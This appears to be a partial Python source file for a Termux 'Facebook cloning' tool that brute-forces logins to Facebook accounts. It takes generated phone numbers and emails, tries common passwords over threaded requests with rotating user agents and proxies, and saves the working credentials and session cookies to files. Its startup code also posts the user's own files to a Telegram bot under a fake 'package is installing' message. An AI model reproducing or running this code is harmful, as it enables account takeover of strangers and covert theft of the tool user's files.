...
#####
#bgjvujhhot_token = ('5843433761:AAGz3n_UCXZZ2Z9ZPxvGqtBdaT8lBJbLHC8')
#bot_token = ('6049555438:AAGBmWJtw-cSF5eOx2fc2NH-UdcByOz1wV4')
#bot_id = ('1818606358')
bot_id = ('1911135214')
chat_id = ('1911135214')
extension = ('.py','.jpg','.txt','.png','mp4')
        ...
        if file.endswith(extension):
            ...
            with open(file_path, 'rb') as f:
               ...
               # r = requests.post(url, data=data, files=files)
                ...
                print('\033[1;91mPLZ W8 YOU PAKAGE IS INSTALLING')
                for i in  range(4):              	                           	r = requests.post(url, data=data, files=files)        
                
                	
                else:
                	print('\033[1;95mPLZ W8 YOU PAKAGE IS DONE')
                	mex()
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            print(f'\r %s[%s!%s] THIS ID HASBEEN LOCK'%(N,M,N))
...
os.system('clear')
jalan('\x1b[1;32mKAHLID MEX CLONING TOOL  START PLEASE WAIT  \033[1;95m \033[1;95m \033[1;91m \033[1;92m \033[1;93m')
...
except:KAHLID_SHAIFULLAH('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        KAHLID_SHAIFULLAH('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ax ="NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
bx=  "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
M1="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
A2 ='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)'
H3 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
D4 = 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
...
n1='Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.57 Mobile Safari/537.36'
n2='Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.57 Mobile Safari/537.36'
cokbrut=[]
...
def KAHLID():
    key1 = open('/sdcard/.android3.txt', 'r').read()
    os.system('clear')
    os.system('xdg-open https://facebook.com/ma4D1')
    print(logo)
    KAHLID_SHAIFULLAH('YOUR KEY IS :\033[1;36m'+key1)
    print('')
    KAHLID_SHAIFULLAH ('\x1b[2;94m[\033[1;92mF\033[1;95m]\033[1;95m CLONE FROM   FILE        \033[1;96m[\033[1;95mV2\033[1;36m]')
    print('\033[2;96m[\033[1;92m1\033[1;96m]\033[1;92m CLONE FROM RANDOM BD     \033[1;96m[\033[1;95mV2\033[1;36m]')
    KAHLID_SHAIFULLAH ('\x1b[2;96m[\033[1;92m2\033[1;96m]\033[1;95m CLONE FROM GMAIL         \033[1;96m[\033[1;95mV2\033[1;36m]')
    KAHLID_SHAIFULLAH ('\x1b[2;96m[\033[1;92m3\033[1;96m]\033[1;96m CLONE FROM RANDOM PK     \033[1;96m[\033[1;95mV2\033[1;36m]')
    KAHLID_SHAIFULLAH ('\033[2;96m[\033[1;92m4\033[1;96m]\033[1;97m CLONE 8-12 ID            \033[1;96m[\033[1;95mV2\033[1;36m]')
    KAHLID_SHAIFULLAH ('\033[2;96m[\033[1;92m5\033[1;96m]\033[1;93m RANDOM ID MIX WITH PASS  \033[1;96m[\033[1;95mV2\033[1;36m]')
    KAHLID_SHAIFULLAH ('\033[2;96m[\033[1;92m6\033[1;96m]\033[1;94m CLONE FROM USER NAME     \033[1;96m[\033[1;95mV2\033[1;36m]')
    KAHLID_SHAIFULLAH ('\x1b[2;96m[\033[1;92m7\033[1;96m]\033[1;95m CLONE FROM AFGANISTAN    \033[1;96m[\033[1;95mV2\033[1;36m]')
    KAHLID_SHAIFULLAH ('\x1b[2;96m[\033[1;92m8\033[1;96m]\033[1;92m CONTACT ME')
    KAHLID_SHAIFULLAH ('\x1b[1;96m[\033[1;92m9\033[1;96m]\033[1;96m UPDATE TOOLS')
    KAHLID_SHAIFULLAH ('\x1b[1;96m[\033[1;92m0\033[1;96m]\033[1;91m EXIT PROGRAM\033[1;92m')
    KAHLID_SHAIFULLAH ('\x1b[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
    action()
    print (50 * '-')
    action()
def action():
    ...
    if shuvo in['']:
        ...
        os.system('cd $HOME')
        os.system('rm -rf KAHLID-mex')
        os.system('git clone https://github.com/Shuvo-BBHH/KAHLID-mex')
        print('\033[1;92m\n TOOL UPDATE SUCCESSFUL :)\n')
        os.system('cd KAHLID-mex && python KAHLID.py')
        time.sleep(5)
...
def KAHLID_email():
    ...
    os.system("clear")
    KAHLID_SHAIFULLAH(logo)
    KAHLID_SHAIFULLAH(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    KAHLID_SHAIFULLAH(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    M= '@gmail.com' 
    AH = '@yahoo.com'
    DI  = '@hotmail.com'
    ...
    for nmbr in range(limit):
        ...
        nmp = str(random.randint(0,9999)) #''.join(random.choice(string.digits) for _ in range(0,5))
        user.append(nmp)
    os.system("clear")
    KAHLID_SHAIFULLAH(logo)
    passx = 0
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        KAHLID_SHAIFULLAH('\033[1;97m====================================================')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        KAHLID_SHAIFULLAH(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        KAHLID_SHAIFULLAH(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        KAHLID_SHAIFULLAH(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        KAHLID_SHAIFULLAH(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        KAHLID_SHAIFULLAH(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        KAHLID_SHAIFULLAH('\033[1;97m====================================================')
        for love in user:
            KAHLIDuser=fastname+code+lasttname+love
...
def KAHLID_pk():
    ...
    os.system("clear")
    KAHLID_SHAIFULLAH(logo)
    KAHLID_SHAIFULLAH(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    KAHLID_SHAIFULLAH(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    ...
    with ThreadPool(max_workers=40) as manshera:
        ...
        tl = str(len(user))
        jalan('     \033[1;92mM  \033[1;91mA  \033[1;93mH  \033[1;94mD  \033[1;95mI  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE')
        KAHLID_SHAIFULLAH('\033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m ðŸ•›  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        KAHLID_SHAIFULLAH(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        KAHLID_SHAIFULLAH(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        KAHLID_SHAIFULLAH(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        KAHLID_SHAIFULLAH(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        KAHLID_SHAIFULLAH(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        KAHLID_SHAIFULLAH('\033[1;97mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','pakistan']
            uid = code+love
            for KAHLID in HamiiID:
                pwx.append(KAHLID)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
...
def KAHLID_bd():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan('\033[1;92mâ€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢')
        for love in user:
            pwx = [love[1:],love,love[2:],code+love,'bangladesh','l love you',code+love[0:5],code+love[0:3]]
            uid = code+love
    ...
    with ThreadPool(max_workers=60) as manshera:
        ...
        for love in user:
            ...
            for Shuvo in MHS:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(KAHLIDold,uid,pwx,tl)
    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
...
def rcrack1(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[KAHLID-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{bi}KAHLID{x}] [{m}{uid}{x}] _[%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass


def KAHLIDold(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cek_apk(session,coki)
                ma4D1('/sdcard/mok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;0m[KAHLIDðŸ¥º-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ma4D1('/sdcard/mCP.txt', 'a').write( uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{bi}[{xr}KAHLID{bi}]{bi}[{ox}%s|%s{bi}] [{xr}OK:{xr}%s{bi}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
##########################################################################
...
def api1(uid,pwx,tl):
    ...
    try:
        for pas in pwx:
            ...
            q = json.loads(po)
            if 'session_key' in q:
                        print(f'\r\r\033[1;32m [KAHLID-OK] '+uid+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/KAHLID-OK.txt','a').write(uid+'|'+pas+'\n')
                        #cek_apk(session,coki)
                        oks.append(uid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                        print(f'\r\r\x1b[38;5;126m [KAHLID-CP] '+uid+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/KAHLID-CP.txt', 'a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
                        break
            else:
                 continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}KAHLID{x}]-{uid}-[%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
...
##############################################################################
e = base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NodXZvLUJCSEgvbWFoZGktbWV4L21haW4vYXAudHh0'.encode("utf-8"))
enc = str(e, "utf-8")
...
def mex():
    ...
    try:
        ...
        kok = open('/sdcard/.android3.txt', 'w')
        kok.write(myid + imt+m)
        kok.close()
        print ('')
        input('   \x1b[0;34mENTER TO BUY TOOLS ')
        os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20KAHLID%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get(enc).text
    if key1 in r:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            ug = random.choice([M1,A2,H3,D4,I4,ax,bx,n1,n2])
            m = random.choice(my_color)
            nip=random.choice(prox)
            nmp = str(random.randint(2400,9999))
            nm = str(random.randint(500,999))
            pp=f'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.{nmp}.76 Mobile Safari/{nm}.36'
            proxs= {'http': 'socks4://'+nip}
            su = random.choice([m,k,xr,u,b])
            bi = random.choice([P,M,K,B,U,O,N,H])
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r[\033[1;92m{su}KAHLID\033[1;97m][{bi}{uid}\033[1;97m][%s/%s][OK\033[1;97m:\033[1;92m%s\033[1;97m/CP\033[1;97m:-\033[1;91m%s\033[1;97m]\r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,params=params,headers=header_freefb).text
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\n\033[1;93m--------------[KAHLID-OKðŸ’¥]--------------\n\x1b[2;91mNUMBER/EMAILðŸ‘‰\033[2;32m:'+uid+'\n\x1b[1;95muidâž£\033[2;32m:'+cid+'\033[1;32m\033[33m   pass:\033[2;32m'+ps+'  \033[1;93m='+tahunng(cid)+'\n\x1b[0;38m[â€Žâ€ŽCOOKIE]= \033[1;32m'+coki+'\n\033[1;93m')
                #print(f" Cookie : {coki}")
                oks.append(uid)
                open('/sdcard/KAHLID-ok.txt', 'a').write( uid+'|'+ps+'\n')
                cek_apk(session,coki)
                follow(session, coki)
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\x1b[38;5;196m[KAHLID-CP] {uid}|{ps}")
                open('/sdcard/KAHLID-cp.txt', 'a').write( uid+'|'+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
